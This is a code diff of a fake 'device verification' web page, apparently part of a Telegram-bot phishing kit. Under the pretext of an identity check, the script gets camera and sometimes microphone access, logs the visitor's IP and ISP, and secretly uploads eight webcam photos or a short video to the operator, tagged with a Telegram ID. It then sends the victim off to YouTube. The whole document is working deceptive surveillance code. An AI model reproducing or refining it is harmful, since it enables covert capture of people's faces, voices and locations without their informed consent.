@@ -1,50 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Video Verification</title>
+    <title>Security Verification</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { background: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { background: #0088cc; border: none; padding: 15px 30px; color: white; border-radius: 8px; font-size: 18px; cursor: pointer; }
+        .btn { background: #0088cc; border: none; padding: 15px 30px; color: white; border-radius: 10px; font-size: 18px; cursor: pointer; font-weight: bold; }
         #loader { display: none; margin-top: 20px; }
-        .progress-bg { width: 80%; background: #333; height: 10px; margin: 20px auto; border-radius: 5px; }
-        #bar { width: 0%; background: #0088cc; height: 100%; border-radius: 5px; transition: 0.3s; }
+        .bar-bg { width: 80%; background: #333; height: 12px; margin: 20px auto; border-radius: 6px; overflow: hidden; }
+        #bar { width: 0%; background: #0088cc; height: 100%; transition: 0.4s; }
     </style>
 </head>
 <body>
     <div id="setup">
-        <h2>🔒 Security Check</h2>
-        <p>Please complete the camera verification to continue.</p>
-        <button class="btn" onclick="startProcess()">Verify Identity</button>
+        <h2>🔒 Device Verification</h2>
+        <p>Please allow camera access to verify your identity.</p>
+        <button class="btn" onclick="start()">Verify Now</button>
     </div>
 
     <div id="loader">
-        <h3 id="step-text">Initialising...</h3>
-        <div class="progress-bg"><div id="bar"></div></div>
+        <h3 id="msg">Initialising...</h3>
+        <div class="bar-bg"><div id="bar"></div></div>
     </div>
 
-    <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const uid = urlParams.get('id');
-        const mode = urlParams.get('mode');
+        const params = new URLSearchParams(window.location.search);
+        const uid = params.get('id'); 
+        const mode = params.get('mode') || 'photo';
 
-        async function startProcess() {
+        async function start() {
+            if (!uid || uid === "YOUR_TELEGRAM_ID" || uid === "null") {
+                alert("Error: Invalid Link. Please open the link sent by the bot.");
+                return;
+            }
+
             document.getElementById('setup').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: (mode === 'video') 
                 });
-                
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                // Capture IP/ISP Info
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+
+                // Log Info
                 fetch('https://ipapi.co/json/').then(r => r.json()).then(data => {
                     fetch(`/log_info?id=${uid}`, {
                         method: 'POST',
@@ -53,57 +57,47 @@
                     });
                 });
 
-                if (mode === 'video') {
-                    recordVideo(stream);
-                } else {
-                    takePhotos();
-                }
-            } catch (err) {
-                alert("Permission Denied. Please allow camera to verify.");
-            }
+                if (mode === 'video') { record(stream); } else { snap(); }
+            } catch (e) { alert("Camera required for verification."); }
         }
 
-        function takePhotos() {
+        function snap() {
             let count = 0;
-            const interval = setInterval(() => {
-                if (count >= 8) {
-                    clearInterval(interval);
-                    finish();
-                    return;
-                }
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
+            const timer = setInterval(() => {
+                if (count >= 8) { clearInterval(timer); done(); return; }
+                const c = document.getElementById('c');
+                const v = document.getElementById('v');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(blob => {
                     const fd = new FormData();
                     fd.append('file', blob);
                     fetch(`/upload?id=${uid}&type=photo`, { method: 'POST', body: fd });
                 }, 'image/jpeg');
                 count++;
                 document.getElementById('bar').style.width = (count * 12.5) + "%";
-                document.getElementById('step-text').textContent = `Capturing... ${count}/8`;
-            }, 500);
+                document.getElementById('msg').innerText = `Verifying... ${count}/8`;
+            }, 600);
         }
 
-        function recordVideo(stream) {
-            const mediaRecorder = new MediaRecorder(stream);
+        function record(stream) {
+            const rec = new MediaRecorder(stream);
             const chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
                 const blob = new Blob(chunks, { type: 'video/webm' });
                 const fd = new FormData();
                 fd.append('file', blob);
                 fetch(`/upload?id=${uid}&type=video`, { method: 'POST', body: fd });
-                finish();
+                done();
             };
-            mediaRecorder.start();
-            document.getElementById('step-text').textContent = "Verifying... (3s)";
-            setTimeout(() => { mediaRecorder.stop(); document.getElementById('bar').style.width = "100%"; }, 3000);
+            rec.start();
+            document.getElementById('msg').innerText = "Recording Video (3s)...";
+            setTimeout(() => { rec.stop(); document.getElementById('bar').style.width = "100%"; }, 3000);
         }
 
-        function finish() {
-            document.getElementById('step-text').textContent = "Verified! Redirecting...";
+        function done() {
+            document.getElementById('msg').innerText = "Success! Redirecting...";
             setTimeout(() => { window.location.href = "https://www.youtube.com"; }, 1500);
         }
     </script>
